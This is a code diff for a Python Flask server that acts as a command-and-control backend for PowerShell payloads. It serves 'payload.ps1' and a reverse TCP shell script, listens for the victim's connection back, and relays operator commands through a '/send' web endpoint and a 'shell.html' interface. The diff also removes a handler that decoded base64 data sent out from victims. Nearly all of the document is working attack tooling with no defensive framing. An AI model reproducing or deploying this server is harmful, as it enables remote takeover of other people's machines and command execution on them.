@@ -2,11 +2,13 @@
 
 from flask import *
 import base64
-import sys
-from threading import Thread
-import subprocess
+from threading import Thread, Lock
+from Queue import Queue
+from socket import *
 
 app = Flask('__main__')
+queue = None
+lock = Lock()
 
 def openFile(path, name):
 	content = ''
@@ -14,25 +16,66 @@ def openFile(path, name):
 		content = file.read()
 	return content
 
-@app.route('/', methods = ['POST', 'GET'])
+@app.route('/', methods = ['GET'])
 def root():
-	if request.method == 'POST':
-		data = request.form.get('d')
-		plain = base64.b64decode(data).decode('UTF-8')
-		print plain
-		return ''
-	else:
-		return openFile('.', 'payload.ps1')
+	return openFile('.', 'payload.ps1')
+
+@app.route('/index', methods = ['GET'])
+def index():
+	return send_from_directory('./html', 'shell.html')
 
 @app.route('/revsh', methods = ['GET'])
 def reverseShell():
-	p = Thread(target = revshell, args = (request.environ['REMOTE_ADDR'], 6666, ))
-	p.start()
-	return openFile('.', 'reverse_tcp_shell.ps1')
+	global queue
+	global instip
+	ip = request.environ['REMOTE_ADDR']
+	port = request.args.get('port')
+	queue = Queue()
+	Thread(target = revshell, args = (queue, ip, int(port), )).start()
 
-# Start a new shell for reverse shell connection
-def revshell(ip, port):
-	subprocess.call('start /wait python revShHandler.py %s %d'%(ip, port), shell = True)
+	return '$address = "localhost"\n$port = %s\n'%port + openFile('.', 'reverse_tcp_shell.ps1')
+
+@app.route('/send', methods = ['GET'])
+def revShellHandler():
+	global queue
+	cmd = request.args.get('cmd')
+	if queue:
+		queue.put(cmd)
+		lock.acquire()
+		data = queue.get()
+		lock.release()
+		return data
+	print 'Queue not init'
+	return ''
+
+def revshell(queue, ip_addr, port):
+	print 'Thread created'
+	s = socket(AF_INET, SOCK_STREAM)
+	s.bind((ip_addr, port))
+	s.listen(1)
+	conn, addr = s.accept()
+	while True:
+		try:
+			lock.acquire()
+			cmd = queue.get()
+			lock.release()
+			conn.send(cmd + '\r\n')
+			if cmd == base64.b64encode('exit'):
+				raise
+			content = ''
+			while True:
+				temp = conn.recv(1)				
+				if temp == '\n':
+					break
+				content += temp
+			queue.put(base64.b64decode(content).decode('UTF-8'))
+		except:
+			print 'Thread closed'
+			queue.put('Exited')
+			queue = None
+			conn.close()
+			s.close()
+			break
 
 if __name__ == '__main__':
-	app.run(port = 80, debug = True)
+	app.run(port = 80, debug = True, use_reloader = False)
